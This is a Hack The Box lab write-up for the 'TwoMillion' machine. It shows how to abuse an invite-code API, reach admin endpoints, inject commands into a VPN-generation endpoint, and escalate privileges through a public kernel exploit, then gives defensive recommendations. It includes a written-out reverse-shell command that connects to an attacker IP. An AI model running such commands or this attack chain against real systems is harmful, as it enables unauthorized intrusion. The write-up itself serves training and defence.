---
title: "TwoMillion"
description: "Exploit the invite API, gain admin API access, inject commands into the VPN generator, and escalate through a kernel exploit."
platform: "Hack The Box"
category: "Linux"
difficulty: "Easy"
publishedAt: 2026-07-30
tags: ["api", "invite-code", "command-injection", "reverse-shell", "linux", "privesc"]
language: "en"
translationKey: "hack-the-box/twomillion"
draft: false
featured: true
cover: "/images/twomillion/two-million-02.png"
---

> This write-up was produced in a controlled lab environment. Only apply the techniques below to systems you are authorized to test.

## Service enumeration

Scan the target for open TCP ports:

![Nmap scan results](/images/twomillion/two-million-01.png)

The target exposes a web service, so begin by opening the application and inspecting its loaded JavaScript files:

![Inspecting the web application and its JavaScript](/images/twomillion/two-million-02.png)

## Analyzing the invite-code API

Open the application's JavaScript file:

![Opening the JavaScript file](/images/twomillion/two-million-03.png)

The code is obfuscated. Copy it into a deobfuscation tool to inspect the underlying logic:

![The JavaScript after deobfuscation](/images/twomillion/two-million-04.png)

The `makeInviteCode` function calls this endpoint:

```text
/api/v1/invite/how/to/generate
```

![makeInviteCode calls the invite-generation hint endpoint](/images/twomillion/two-million-05.png)

Calling the endpoint returns an encoded string. Decoding it produces:

```text
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

![The API returns invite-code generation instructions](/images/twomillion/two-million-06.png)

The response is Base64-encoded. Send `POST /api/v1/invite/generate`, decode the result, and recover an invite code:

```text
SZ1JG-326ND-L51VI-8OK7K
```

Invite codes are single-use. Call the generation endpoint again whenever a new code is required.

![Decoding the Base64 invite code](/images/twomillion/two-million-07.png)

## Registration and API enumeration

Create an account with the invite code. Then open the Access page and use Burp Suite to inspect requests:

![Registering an account with the invite code](/images/twomillion/two-million-08.png)

![Inspecting requests in Burp Suite](/images/twomillion/two-million-09.png)

Enumerate the API:

![Enumerating API endpoints](/images/twomillion/two-million-10.png)

The first request returns `401 Unauthorized` because there is no active session. Sign in with the newly created account:

![Signing in with the new account](/images/twomillion/two-million-11.png)

![The API response after authentication](/images/twomillion/two-million-12.png)

Endpoints under `/api/v1/admin` are now visible. They are an important attack surface because they control admin functions and VPN generation.

## Exploiting the admin API

Test the admin endpoints and injection payloads. The notable endpoint is:

```text
/api/v1/admin/vpn/generate
```

Its input is vulnerable to command injection:

![Command injection in the VPN generation API](/images/twomillion/two-million-13.png)

Use a reverse shell to make the target connect back to the local machine:

```bash
sh -i >& /dev/tcp/10.10.14.69/9001 0>&1
```

![Sending the reverse-shell payload through the API](/images/twomillion/two-million-14.png)

Once the shell is established, inspect configuration data and recover credentials:

![Credentials recovered from the target](/images/twomillion/two-million-15.png)

Connect to the target over SSH:

![Connecting over SSH with the recovered credentials](/images/twomillion/two-million-16.png)

![Reading the user flag](/images/twomillion/two-million-17.png)

The user flag is now available in the `admin` user's home directory.

## Privilege escalation

Use the Hack The Box hint and the target's system information to identify a privilege-escalation path:

![A hint for the privilege-escalation path](/images/twomillion/two-million-18.png)

![Kernel and operating-system information](/images/twomillion/two-million-19.png)

The collected data points to a Linux kernel vulnerability with a public exploit. Download the open-source exploit from GitHub:

![Downloading the open-source exploit from GitHub](/images/twomillion/two-million-20.png)

Start an HTTP server locally so the target can download the exploit:

![Starting a local HTTP server](/images/twomillion/two-million-21.png)

![The target downloads the exploit](/images/twomillion/two-million-22.png)

Open two terminal tabs: run the exploit script in one and use the other to access the root shell:

![Running the privilege-escalation exploit](/images/twomillion/two-million-23.png)

![Obtaining a root shell](/images/twomillion/two-million-24.png)

## Conclusion

### API exploitation

The API attack chain contains three important failures:

- The application exposes invite-code logic in client-side JavaScript. Deobfuscating it reveals `/api/v1/invite/how/to/generate`, which leads to `POST /api/v1/invite/generate` and a valid invite code.
- Admin endpoints are not protected by a robust authorization model. After registering and enumerating the API, an attacker can reach endpoints below `/api/v1/admin`, including VPN generation.
- `/api/v1/admin/vpn/generate` passes unsafe user input to a system command. The resulting command injection supports a reverse-shell payload and provides an initial foothold.

**Defensive recommendations:**

- Do not place security-critical logic in the client. Browser JavaScript can always be read, deobfuscated, and debugged.
- Enforce authentication and authorization server-side on every API endpoint, especially admin endpoints.
- Never concatenate user input into shell commands. If a system command is unavoidable, use an argument array, allowlist accepted values, and strictly validate input.
- Log and alert on unusual admin API requests, especially payloads containing shell metacharacters such as `;`, `&`, `|`, `$()`, backticks, or redirects.

### Privilege escalation

After obtaining SSH access as `admin`, inspect the operating system, kernel, and installed packages. The HTB hint and host information show that the kernel has a publicly exploitable vulnerability. A successful exploit elevates the unprivileged user to root and provides access to `root.txt`.

This is a common CTF and lab escalation pattern: an initial web foothold is followed by an operating-system configuration issue or an unpatched kernel vulnerability.

**Defensive recommendations:**

- Apply kernel and security updates regularly, prioritizing vulnerabilities with public exploits.
- Enforce least privilege for the web application account and system users.
- Enable hardening controls such as AppArmor or SELinux, and restrict unprivileged user namespaces where they are unnecessary.
- Monitor post-exploitation behavior such as downloads into `/tmp`, execution of unknown binaries, and reverse connections to external IP addresses.
